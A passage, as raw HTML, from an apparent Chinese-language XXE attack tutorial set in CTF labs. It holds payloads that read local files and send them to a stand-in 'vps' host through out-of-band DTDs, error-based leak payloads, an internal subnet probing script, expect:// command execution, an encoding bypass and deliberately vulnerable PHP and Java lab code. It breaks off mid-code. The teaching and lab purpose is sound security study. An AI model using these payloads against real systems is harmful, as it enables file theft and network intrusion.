”</code>指的就是禁止内部参数实体引用</p><p>所以需要调用的外部的<code>dtd</code></p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">go</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">end</span> <span class="hljs-string">&quot;]]&gt;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps/evil.dtd&quot;</span>&gt;</span>%dtd;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;%start;%go;%end;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-2.png"></p><h2 id="无回显任意文件读取-Blind-Based-XXE"><a href="#无回显任意文件读取-Blind-Based-XXE" class="headerlink" title="无回显任意文件读取(Blind Based XXE)"></a>无回显任意文件读取(Blind Based XXE)</h2><p>xxe.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h3><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;%int;%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vps:port?a=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>vps上监听对应的端口</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-3.png"></p><p>先调用了<code>%remote</code>，请求远程服务器上的<code>evil.dtd</code>，类似php的<code>include</code>，然后<code>%int</code>调用<code>%file</code>，<code>%file</code>获取敏感文件后将结果填入到<code>%send</code>，最后调用<code>%send</code>把我们的读取到的数据发送到我们的远程服务器上，这样就实现了外带数据的效果，要注意实体的值中不能有<code>%</code>, 所以将其转成html实体编码</p><h3 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h3><p>以上都是引入外部服务器的<code>OOB XXE（Out-of-band）</code>，虽然好用，但是有一个软肋。当服务器配置好防火墙，禁止服务器请求外网dtd文件的话，就无法接受到数据了。</p><p>这时候就可以考虑利用本地dtd来进行XXE</p><p>linux</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ISOamsa</span> <span class="hljs-string">&#x27;Your DTD code&#x27;</span>&gt;</span><br>%local_dtd;<br></code></pre></td></tr></table></figure><p>windows</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file://C:/Windows/System32/wbem/xml/cim20.dtd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">SuperClass</span> <span class="hljs-string">&#x27;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#x27;</span>&gt;</span><br>%local_dtd;<br></code></pre></td></tr></table></figure><p>引用内部实体payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;/usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ISOamso</span> <span class="hljs-string">&#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;eval;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;send;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">    &#x27;</span>&gt;</span></span><br><span class="hljs-meta">    %remote;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>1234<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="基于报错的XXE-Error-Based-XXE"><a href="#基于报错的XXE-Error-Based-XXE" class="headerlink" title="基于报错的XXE(Error Based XXE)"></a>基于报错的XXE(Error Based XXE)</h2><p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。</p><p>出网payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;https://vps/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %remote;</span><br><span class="hljs-meta">    %error;</span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; error SYSTEM &#x27;file:///fakefile/%file;&#x27;&gt;&quot;</span>&gt;</span><br>%start;<br></code></pre></td></tr></table></figure><p>不出网如果可以写文件的话就可以构造本地恶意dtd</p><p>不出网payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///tmp/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">condition</span> <span class="hljs-string">&#x27;aaa)&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;eval;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;error;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ELEMENT aa (bb&#x27;</span>&gt;</span></span><br><span class="hljs-meta">    %local_dtd;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>flag<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>root<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">condition</span> <span class="hljs-string">&quot;and | or | not | equal | contains | exists | subdomain-of&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">pattern</span> (%<span class="hljs-keyword">condition</span>;)&gt;</span><br></code></pre></td></tr></table></figure><h2 id="探测内网主机与端口"><a href="#探测内网主机与端口" class="headerlink" title="探测内网主机与端口"></a>探测内网主机与端口</h2><p>利用http协议和网页响应时间来判断主机存活</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">XXE</span>(<span class="hljs-params">ip,string</span>):<br>    <span class="hljs-keyword">try</span>:<br>        xml = <span class="hljs-string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="hljs-string">&#x27;&quot;&#x27;</span> + string + <span class="hljs-string">&#x27;&quot;&#x27;</span> + <span class="hljs-string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span><br>        x = requests.post(<span class="hljs-string">&#x27;http://192.168.91.134/xml.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="hljs-number">5</span>).text<br>        coded_string = x.split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">2</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; [+]&#x27;</span>,ip,<span class="hljs-string">&#x27;Successfully Found !!!&#x27;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; [-]&#x27;</span>,ip,<span class="hljs-string">&#x27;Error Not Found !!!&#x27;</span>)<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    headers = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/xml&#x27;</span>&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">130</span>,<span class="hljs-number">150</span>):<br>        ip = <span class="hljs-string">&#x27;192.168.91.&#x27;</span> + <span class="hljs-built_in">str</span>(i)<br>        string = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="hljs-string">&#x27;/&#x27;</span><br>        XXE(ip,string)<br></code></pre></td></tr></table></figure><p>根据返回内容的不同来判断端口是否开启</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.91.149:80&quot;</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">xxe</span> (<span class="hljs-keyword">#PCDATA</span>) &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xxe</span>&gt;</span>666<span class="hljs-tag">&lt;/<span class="hljs-name">xxe</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><p>在安装<code>expect</code>扩展的<code>PHP</code>环境里执行系统命令</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">name</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>利用<code>utf-16</code>编码绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://9b6b0b8a-f306-4372-9f2c-60abfae7b4d4.challenge.ctf.show/&#x27;</span><br>payload = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;!DOCTYPE convert [</span><br><span class="hljs-string">&lt;!ENTITY % remote SYSTEM &quot;http://vps/evil.dtd&quot;&gt;</span><br><span class="hljs-string">%remote;%int;%send;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = payload.encode(<span class="hljs-string">&#x27;utf-16&#x27;</span>)<br>rep = requests.post(url=url, data=payload)<br><span class="hljs-built_in">print</span>(rep.text)<br></code></pre></td></tr></table></figure><p>或者命令转换编码<code>iconv -f utf8 -t UTF-32LE  1.xml &gt; 2.xml</code>，<code>echo urlencode(file_get_contents(&quot;payload.xml&quot;));</code>读</p><h2 id="jar-x2F-x2F-文件上传"><a href="#jar-x2F-x2F-文件上传" class="headerlink" title="jar:&#x2F;&#x2F; 文件上传"></a>jar:&#x2F;&#x2F; 文件上传</h2><p><code>Java</code>环境下还可以利用<code>jar</code>协议上传文件</p><p><code>jar</code>协议语法，<code>jar:&#123;url&#125;!/&#123;entry&#125;</code>，<code>url</code>是文件的路径，<code>entry</code>是想要解压出来的文件</p><p>jar 协议处理文件的过程：<br>1：下载 jar&#x2F;zip 文件到临时文件中<br>2：提取出我们指定的文件<br>3：删除临时文件</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY  <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;jar:http://ip:port/1.zip!/1.php&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">convert</span>&gt;</span><span class="hljs-symbol">&amp;remote;</span><span class="hljs-tag">&lt;/<span class="hljs-name">convert</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当<code>1.zip</code>中没有<code>1.php</code>时，<code>java</code>解析器就会报错，说在这个临时文件中找不到这个文件，这样就得到了临时文件的路径，可以利用文件包含等漏洞去进一步利用这个文件，其原理类似于<code>php</code>的<code>phpinfo</code>临时文件包含</p><p>本地搭建一个环境测试：</p><p>main.java，部署在tomcat上，模拟一个存在xxe漏洞的网页</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.w3c.dom.Element;<br><span class="hljs-keyword">import</span> org.w3c.dom.Node;<br><span class="hljs-keyword">import</span> org.w3c.dom.NodeList;<br><span class="hljs-keyword">import</span> org.xml.sax.InputSource;<br><span class="hljs-keyword">import</span> org.w3c.dom.Document;<br><span class="hljs-keyword">import</span> org.xml.sax.SAXException;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilder;<br><span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;<br><span class="hljs-keyword">import</span> javax.xml.parsers.ParserConfigurationException;<br><br><span class="hljs-meta">@WebServlet(&quot;/xxe&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">main</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">parmeter</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;poc&quot;</span>);<br><br>        <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br>        <span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            db = dbf.newDocumentBuilder();<br>        &#125; <span class="hljs-keyword">catch</span> (ParserConfigurationException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-type">StringReader</span> <span class="hljs-variable">sr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(parmeter);<br>        <span class="hljs-type">InputSource</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(sr);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Document</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> db.parse(is);<br>            <span class="hljs-type">PrintWriter</span> 